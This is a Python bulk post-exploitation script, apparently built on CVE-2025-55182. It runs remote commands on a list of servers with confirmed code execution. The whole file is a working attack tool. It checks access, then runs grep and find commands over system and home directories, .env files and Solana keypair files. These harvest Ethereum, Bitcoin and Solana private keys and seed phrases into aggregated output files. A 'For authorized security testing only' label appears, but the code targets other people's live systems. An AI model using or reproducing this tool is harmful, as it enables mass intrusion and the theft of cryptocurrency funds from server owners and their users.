"""
Bulk Runner for CVE-2025-55182 — Crypto Key Harvester
Reads targets from rce_confirmed.txt and runs:
  - Menu 18: find_env_config (environment configuration finder)
  - Menu 21: crypto_finder (EVM + BTC wallet finder)
  - Auto key extraction for: EVM, BTC, SOL, SEED

All output saved to bulk_output/ with per-target logs and aggregated key files.

NOTE: This module requires exe.py with find_env_config, crypto_finder, exec_rce.
For authorized security testing only.
"""

import sys
import os
import re
import glob
import time
from datetime import datetime

# Try to import from exe.py (same directory)
try:
    from exe import find_env_config, crypto_finder, exec_rce
    HAS_EXE = True
except ImportError:
    HAS_EXE = False
    print("[!] exe.py not found. Menu 18/21 will be skipped.")

ANSI_RE = re.compile(r'\x1b\[[0-9;]*m')

INPUT_FILE = "rce_confirmed.txt"
OUT_DIR = "bulk_output"

# Filesystem roots to grep on each target
SCAN_PATHS = "/app /workdir /home /root /tmp /opt /etc /var/www /srv /data /usr/src"

# ─── Key extraction regexes ─────────────────────────────────────────────────
RE_EVM_HEX64   = re.compile(r'\b(?:0x)?[a-fA-F0-9]{64}\b')
RE_BTC_WIF     = re.compile(r'\b[5KL][1-9A-HJ-NP-Za-km-z]{50,51}\b')
RE_BTC_XPRV    = re.compile(r'\b(?:xprv|zprv|yprv|tprv)9[1-9A-HJ-NP-Za-km-z]{105,110}\b')
RE_SOL_B58     = re.compile(r'\b[1-9A-HJ-NP-Za-km-z]{87,88}\b')
RE_SOL_ARRAY   = re.compile(r'\[\s*(?:\d{1,3}\s*,\s*){63}\d{1,3}\s*\]')
RE_MNEMONIC    = re.compile(r'\b((?:[a-z]{3,8}\s+){11,23}[a-z]{3,8})\b')

# Context keywords required to keep an EVM hex64 match
RE_EVM_CTX = re.compile(
    r'(PRIVATE_?KEY|PRIVKEY|PRIV_KEY|MNEMONIC|SIGNER|DEPLOYER|WALLET|'
    r'SECRET|HARDHAT|FOUNDRY|FORGE|TRUFFLE|ANVIL|METAMASK|ETHER|WEB3)',
    re.I,
)

# Context for raw Solana base58
RE_SOL_CTX = re.compile(
    r'(SOLANA|SOL_|PHANTOM|KEYPAIR|ANCHOR|SECRET_?KEY|PRIVATE_?KEY|WALLET)',
    re.I,
)

# Common Ethereum/Solana zero / dummy keys to drop
NOISE_KEYS = {
    '0x' + '0' * 64,
    '0x' + 'f' * 64,
    '0' * 64,
}

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
CYAN = '\033[96m'
RESET = '\033[0m'


def color_print(color, *args, **kwargs):
    """Print with color"""
    print(f"{color}{' '.join(str(a) for a in args)}{RESET}", **kwargs)


class Tee:
    """Write to multiple streams at once. Strips ANSI colors before writing to files."""

    def __init__(self, *streams_with_flags):
        self.streams = streams_with_flags

    def write(self, data):
        for stream, strip in self.streams:
            try:
                stream.write(ANSI_RE.sub('', data) if strip else data)
            except Exception:
                pass

    def flush(self):
        for stream, _ in self.streams:
            try:
                stream.flush()
            except Exception:
                pass


def load_targets(path):
    """Load targets from file"""
    targets = []
    if not os.path.exists(path):
        print(f"{RED}[!] File not found: {path}{RESET}")
        return targets
    with open(path) as f:
        for line in f:
            url = line.strip().split('|')[0].strip()
            if url.startswith('http'):
                targets.append(url)
    return targets


def safe_name(url):
    """Safe filename from URL"""
    return re.sub(r'[^A-Za-z0-9_.-]', '_', url)[:120]


# ─── Key Harvester ─────────────────────────────────────────────────────────
class KeyHarvester:
    """Aggregates extracted keys across all targets, deduped, with per-chain files."""

    BUCKETS = {
        'evm':      'keys_evm.txt',
        'btc':      'keys_btc.txt',
        'solana':   'keys_solana.txt',
        'mnemonic': 'keys_mnemonic.txt',
    }

    def __init__(self, out_dir):
        self.out_dir = out_dir
        self.seen = set()
        self.files = {}
        for k, name in self.BUCKETS.items():
            self.files[k] = open(os.path.join(out_dir, name), 'a')
        self.csv = open(os.path.join(out_dir, 'keys_all.csv'), 'a')
        if self.csv.tell() == 0:
            self.csv.write('timestamp,url,chain,key,source\n')
        self.counts = {k: 0 for k in self.BUCKETS}

    def _bucket(self, chain):
        if chain in ('btc_wif', 'btc_xprv'):
            return 'btc'
        if chain in ('sol_b58', 'sol_arr'):
            return 'solana'
        if chain == 'mnemonic':
            return 'mnemonic'
        return 'evm'

    def add(self, url, chain, key, source=''):
        key = key.strip().strip('"\'')
        if not key or key.lower() in NOISE_KEYS:
            return False
        dedup_key = (chain, key)
        if dedup_key in self.seen:
            return False
        self.seen.add(dedup_key)

        bucket = self._bucket(chain)
        line = f"{url} | {key}"
        if source:
            line += f"  # {source[:200].replace(chr(10), ' ')}"
        self.files[bucket].write(line + '\n')
        self.files[bucket].flush()

        ts = datetime.now().isoformat(timespec='seconds')
        def csv_esc(s):
            return '"' + str(s).replace('"', '""') + '"'
        self.csv.write(
            f'{ts},{csv_esc(url)},{chain},{csv_esc(key)},{csv_esc(source)}\n'
        )
        self.csv.flush()
        self.counts[bucket] += 1
        return True

    def close(self):
        for f in self.files.values():
            f.close()
        self.csv.close()


# ─── Active key extraction via RCE ─────────────────────────────────────────
def _grep_cmd(pattern, paths=SCAN_PATHS, head=200):
    """Build a grep command that returns matched lines with file path prefix."""
    return (
        "grep -rEnIH --binary-files=without-match "
        "--exclude-dir=node_modules --exclude-dir=.git --exclude-dir=.next "
        f"-e '{pattern}' {paths} 2>/dev/null | head -{head}"
    )


def harvest_keys(url, harvester):
    """Run targeted RCE greps against the live target and feed hits to harvester."""
    if not HAS_EXE:
        print(f"{YELLOW}[!] Skipping key harvest: exe.py not available{RESET}")
        return

    print(f"\n{CYAN}{'#' * 80}{RESET}")
    print(f"{CYAN}# AUTO KEY EXTRACTOR — {url}{RESET}")
    print(f"{CYAN}{'#' * 80}{RESET}")

    queries = [
        (
            "EVM hex64 with context",
            'evm',
            _grep_cmd(
                r'(PRIVATE_KEY|PRIVKEY|PRIV_KEY|SIGNER|DEPLOYER|WALLET|'
                r'MNEMONIC|HARDHAT|FOUNDRY).*(0x)?[a-fA-F0-9]{64}'
            ),
            RE_EVM_HEX64,
            True,
        ),
        (
            "EVM hex64 in .env files (loose)",
            'evm',
            "find / -maxdepth 7 -type f '(' -name '.env' -o -name '.env.*' "
            "-o -name '*.env' ')' -not -path '*/node_modules/*' 2>/dev/null "
            "| xargs -r grep -EnIH '(0x)?[a-fA-F0-9]{64}' 2>/dev/null | head -100",
            RE_EVM_HEX64,
            True,
        ),
        (
            "BTC WIF",
            'btc_wif',
            _grep_cmd(r'[5KL][1-9A-HJ-NP-Za-km-z]{50,51}'),
            RE_BTC_WIF,
            False,
        ),
        (
            "BTC extended xprv/zprv/yprv/tprv",
            'btc_xprv',
            _grep_cmd(r'(xprv|zprv|yprv|tprv)9[1-9A-HJ-NP-Za-km-z]{105,108}'),
            RE_BTC_XPRV,
            False,
        ),
        (
            "Solana 64-byte array keypair",
            'sol_arr',
            _grep_cmd(r'\[[[:space:]]*([0-9]{1,3}[[:space:]]*,[[:space:]]*){63}[0-9]{1,3}[[:space:]]*\]'),
            RE_SOL_ARRAY,
            False,
        ),
        (
            "Solana CLI keypair files",
            'sol_arr',
            "find /root/.config/solana /home/*/.config/solana -type f -name '*.json' "
            "2>/dev/null | while read -r f; do echo \"===== $f =====\"; "
            "cat \"$f\" 2>/dev/null; echo; done",
            RE_SOL_ARRAY,
            False,
        ),
        (
            "Solana base58 with context",
            'sol_b58',
            _grep_cmd(
                r'(SOLANA|SOL_|PHANTOM|KEYPAIR|ANCHOR_WALLET|SECRET_KEY).*'
                r'[1-9A-HJ-NP-Za-km-z]{87,88}'
            ),
            RE_SOL_B58,
            True,
        ),
        (
            "BIP-39 mnemonic candidates",
            'mnemonic',
            _grep_cmd(r'^([a-z]{3,8} ){11,23}[a-z]{3,8}$', head=50),
            RE_MNEMONIC,
            False,
        ),
        (
            "Mnemonic in .env / config",
            'mnemonic',
            "find / -maxdepth 7 -type f '(' -name '.env' -o -name '*.env' "
            "-o -name 'hardhat.config.*' -o -name 'foundry.toml' "
            "')' -not -path '*/node_modules/*' 2>/dev/null "
            "| xargs -r grep -EnIH 'MNEMONIC|SEED_PHRASE|seedPhrase' 2>/dev/null | head -50",
            RE_MNEMONIC,
            False,
        ),
    ]

    for label, chain, cmd, regex, needs_ctx in queries:
        print(f"\n{CYAN}[*] {label}{RESET}")
        ok, out = exec_rce(url, cmd)
        if not ok:
            print(f"    {RED}[-] grep failed: {out}{RESET}")
            continue
        if not out or not out.strip():
            print(f"    {YELLOW}(no match){RESET}")
            continue

        added_here = 0
        for raw_line in out.splitlines():
            line = raw_line.strip()
            if not line:
                continue
            if needs_ctx:
                if chain == 'evm' and not RE_EVM_CTX.search(line):
                    continue
                if chain == 'sol_b58' and not RE_SOL_CTX.search(line):
                    continue

            for m in regex.findall(line):
                key = m if isinstance(m, str) else (m[0] if m else '')
                if not key:
                    continue
                if chain == 'mnemonic':
                    key = re.sub(r'\s+', ' ', key).strip()
                    n = len(key.split())
                    if n not in (12, 15, 18, 21, 24):
                        continue
                if harvester.add(url, chain, key, source=line):
                    added_here += 1

        if added_here:
            print(f"    {GREEN}[+] {added_here} new key(s) added{RESET}")
        else:
            print(f"    {YELLOW}(matches found but deduped or filtered){RESET}")


# ─── Main run ──────────────────────────────────────────────────────────────
def run_for_target(url, combined_log, harvester):
    """Process a single target"""
    ts = datetime.now().strftime('%Y%m%d_%H%M%S')
    per_target_path = os.path.join(OUT_DIR, f"{safe_name(url)}_{ts}.log")

    real_stdout = sys.stdout
    with open(per_target_path, 'w') as per_target_f:
        sys.stdout = Tee(
            (real_stdout, False),
            (combined_log, True),
            (per_target_f, True),
        )
        try:
            print(f"\n{'=' * 80}")
            print(f"### TARGET: {url}")
            print(f"### TIME:   {datetime.now().isoformat(timespec='seconds')}")
            print(f"{'=' * 80}")

            # RCE pre-flight check
            print(f"\n{CYAN}[*] Pre-flight RCE check (id)...{RESET}")
            if HAS_EXE:
                ok, out = exec_rce(url, "id")
                if ok:
                    print(f"{GREEN}[+] RCE OK -> {out}{RESET}")
                else:
                    print(f"{RED}[!] RCE failed: {out}{RESET}")
                    print(f"{YELLOW}[!] Skipping menus & extractor for this target.{RESET}")
                    return False
            else:
                print(f"{YELLOW}[!] exe.py not available, skipping RCE checks{RESET}")
                return False

            # Menu 18 — ENV Config Finder
            if HAS_EXE:
                print(f"\n{CYAN}{'#' * 80}{RESET}")
                print(f"{CYAN}# MENU 18 — ENV CONFIGURATION FINDER{RESET}")
                print(f"{CYAN}{'#' * 80}{RESET}")
                try:
                    find_env_config(url)
                except Exception as e:
                    print(f"{RED}[!] find_env_config crashed: {e}{RESET}")

            # Menu 21 — Crypto Finder
            if HAS_EXE:
                print(f"\n{CYAN}{'#' * 80}{RESET}")
                print(f"{CYAN}# MENU 21 — CRYPTO WALLET FINDER (EVM + BTC){RESET}")
                print(f"{CYAN}{'#' * 80}{RESET}")
                try:
                    crypto_finder(url)
                except Exception as e:
                    print(f"{RED}[!] crypto_finder crashed: {e}{RESET}")

            # Auto key extractor
            try:
                harvest_keys(url, harvester)
            except Exception as e:
                print(f"{RED}[!] harvest_keys crashed: {e}{RESET}")

            print(f"\n{GREEN}[+] Per-target log: {per_target_path}{RESET}")
            return True
        finally:
            sys.stdout = real_stdout


def main(path=None):
    """Run bulk CVE-2025-55182 exploitation on list of RCE-confirmed targets"""
    if path is None:
        path = sys.argv[1] if len(sys.argv) > 1 else INPUT_FILE

    print(f"\n{CYAN}{'='*60}{RESET}")
    print(f"{CYAN}  BULK CVE-2025-55182 KEY HARVESTER{RESET}")
    print(f"{CYAN}{'='*60}{RESET}")

    targets = load_targets(path)
    if not targets:
        print(f"{RED}[!] No targets in {path}{RESET}")
        sys.exit(1)

    os.makedirs(OUT_DIR, exist_ok=True)
    combined_path = os.path.join(
        OUT_DIR, f"bulk_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
    )
    harvester = KeyHarvester(OUT_DIR)

    print(f"\n{GREEN}[*] Loaded {len(targets)} target(s) from {path}{RESET}")
    print(f"{CYAN}[*] Combined log: {combined_path}{RESET}")
    print(f"{CYAN}[*] Per-target logs: {OUT_DIR}/{RESET}")
    print(f"{CYAN}[*] Key files: keys_evm.txt, keys_btc.txt, keys_solana.txt, keys_mnemonic.txt{RESET}")
    print(f"{YELLOW}[!] Running Menu 18 + Menu 21 + auto key extractor on each target.{RESET}\n")

    succeeded = 0
    failed = 0
    with open(combined_path, 'w') as combined_log:
        combined_log.write(f"Bulk run started: {datetime.now().isoformat()}\n")
        combined_log.write(f"Source file: {path}\n")
        combined_log.write(f"Targets: {len(targets)}\n\n")

        try:
            for i, url in enumerate(targets, 1):
                header = f"\n[{i}/{len(targets)}] {url}"
                print(header)
                combined_log.write(header + "\n")
                combined_log.flush()

                t0 = time.time()
                try:
                    ok = run_for_target(url, combined_log, harvester)
                    if ok:
                        succeeded += 1
                    else:
                        failed += 1
                except KeyboardInterrupt:
                    print(f"\n{RED}[!] Interrupted by user{RESET}")
                    combined_log.write("\n[!] Interrupted by user\n")
                    break
                except Exception as e:
                    failed += 1
                    print(f"{RED}[!] Unexpected error: {e}{RESET}")
                    combined_log.write(f"[-] Unexpected error: {e}\n")
                print(f"{CYAN}[*] Done {url} in {time.time() - t0:.1f}s{RESET}")
        finally:
            harvester.close()

        summary = (
            f"\n{'='*50}\n"
            f"  BULK SUMMARY\n"
            f"{'='*50}\n"
            f"  Total targets:  {len(targets)}\n"
            f"  Succeeded:      {succeeded}\n"
            f"  Failed:         {failed}\n"
            f"\n  KEY HARVEST SUMMARY\n"
            f"  EVM keys:       {harvester.counts['evm']}\n"
            f"  BTC keys:       {harvester.counts['btc']}\n"
            f"  Solana keys:    {harvester.counts['solana']}\n"
            f"  Mnemonics:      {harvester.counts['mnemonic']}\n"
        )
        print(f"\n{summary}")
        combined_log.write(summary)

    print(f"\n{GREEN}[+] Combined log saved to {combined_path}{RESET}")
    return {'succeeded': succeeded, 'failed': failed, 'harvester': harvester.counts}


def run(urls: list = None, input_file: str = None, verbose: bool = False):
    """Run bulk exploitation on a list of URLs or from file"""
    if urls:
        # Run on provided URL list
        os.makedirs(OUT_DIR, exist_ok=True)
        combined_path = os.path.join(
            OUT_DIR, f"bulk_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"
        )
        harvester = KeyHarvester(OUT_DIR)
        succeeded = failed = 0

        for url in urls:
            ok = run_for_target(url, open(combined_path, 'a'), harvester)
            if ok:
                succeeded += 1
            else:
                failed += 1

        harvester.close()
        return {'succeeded': succeeded, 'failed': failed, 'keys': harvester.counts}
    else:
        return main(input_file)


if __name__ == "__main__":
    main()
